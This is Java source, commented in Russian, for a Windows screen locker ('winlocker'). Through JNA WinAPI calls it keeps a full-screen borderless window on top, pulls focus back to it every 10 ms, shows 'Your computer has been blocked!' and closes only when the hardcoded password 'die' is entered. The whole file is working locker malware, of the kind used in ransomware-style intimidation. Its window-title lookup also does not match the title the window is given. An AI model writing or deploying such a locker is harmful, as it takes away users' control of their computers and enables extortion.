import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.io.File;
//Подключение библиотек для работы с JNA                               !!!
import com.sun.jna.*;
import com.sun.jna.platform.win32.*;
import com.sun.jna.platform.win32.WinDef.*;
import com.sun.jna.win32.*;

public class block {

	public static void main(String[] args) {
		window myWindow = new window();
	}
}

class window extends JFrame {
	private Timer rTimer;
	private JTextArea text;
	private boolean flagExit = false;
	private HWND hWnd;
	private int wWidth, wHeight;

	public interface MyUser32 extends User32 {
		static final MyUser32 instance = (MyUser32) Native.loadLibrary("user32", MyUser32.class,
				W32APIOptions.DEFAULT_OPTIONS);

		// Установка расположения окна блокировщика
		public boolean SetWindowPos(HWND hwnd, int hwnd2, int arg1, int arg2, int arg3, int arg4, int flags);

		// Включение ввода с клавиатуры в окне блокировщика
		public int EnableWindow(HWND hwnd, boolean enabled);

		// Передача фокуса окну блокирровщика
		public HWND SetFocus(HWND hwnd);
	}

	// Расположение окна поверх других окон
	// Вызываются три функции WinAPI
	private void setAct() {
		// Установка расположения окна блокировщика
		MyUser32.instance.SetWindowPos(hWnd, -1, 0, 0, wWidth, wHeight, 0x0040 | 0x0002 | 0x0001);
		// Включение ввода с клавиатуры в окне блокировщика
		MyUser32.instance.EnableWindow(hWnd, true);
		// Передача фокуса окну блокирровщика
		MyUser32.instance.SetFocus(hWnd);
	}

	private void setWindow() {
		Toolkit tk = Toolkit.getDefaultToolkit();
		Dimension dm = tk.getScreenSize();
		setBounds(0, 0, dm.width, dm.height);
		this.setMinimumSize(dm);
		this.setMaximumSize(dm);
		this.setTitle("winlock");
		this.requestFocus();
		this.setFocusable(true);
		this.toFront();
		this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setUndecorated(true);
		setVisible(true);
	}

	private void setContent() {
		Container cont = getContentPane();
		panel pan = new panel();
		pan.setLayout(null);

		JLabel lab1 = new JLabel("Your computer has been blocked!");
		lab1.setForeground(Color.red);
		lab1.setFont(new Font("system", 1, 60));
		lab1.setBounds(50, 50, 1000, 200);
		pan.add(lab1);

		JLabel lab2 = new JLabel("To unlock you must enter the password:");
		lab2.setForeground(Color.red);
		lab2.setFont(new Font("system", 1, 40));
		lab2.setBounds(50, 150, 1000, 200);
		pan.add(lab2);

		JLabel lab3 = new JLabel(":(");
		lab3.setForeground(Color.white);
		lab3.setFont(new Font("system", 1, 200));
		lab3.setBounds(1100, 0, 1000, 500);
		pan.add(lab3);

		JTextArea text = new JTextArea();
		text.setFont(new Font("system", 1, 30));
		text.setBounds(50, 350, 300, 35);
		pan.add(text);
		cont.add(pan);

		JButton btn = new JButton("Enter");
		btn.setSize(150, 35);
		btn.setLocation(370, 350);
		btn.setFocusable(false);
		btn.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String str = text.getText().toLowerCase().trim();
				String test = (String) "die";
				if (str.equals(test)) {
					rTimer.stop();
					MyUser32.instance.CloseWindow(hWnd);
					flagExit = true;
					System.exit(0);
				} else
					JOptionPane.showMessageDialog(null, "Wrong password!");
			}
		});
		pan.add(btn);
		cont.add(pan);
	}

	public window() {
		addWindowListener(new WindowAdapter() {
			public void windowClosing(WindowEvent evt) {
				if (flagExit == false) {
					setWindow();
				}
			}
		});
		rTimer = new Timer(10, new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				setAct();
			}								
		});
		
		rTimer.start();
		setContent();
		setWindow();
		hWnd=MyUser32.instance.FindWindow(null, "winlocker");

	}
}

class panel extends JPanel {
	Image bg;
	Dimension dm;

	public panel() {
		Toolkit tk = Toolkit.getDefaultToolkit();
		dm = tk.getScreenSize();
		try {
			bg = ImageIO.read(new File("./pic_winlock//blue_bg.jpg"));
		} catch (Exception e) {
		}

	}

	public void paintComponent(Graphics gr) {
		gr.drawImage(bg, 0, 0, dm.width, dm.height, null);
	}
}
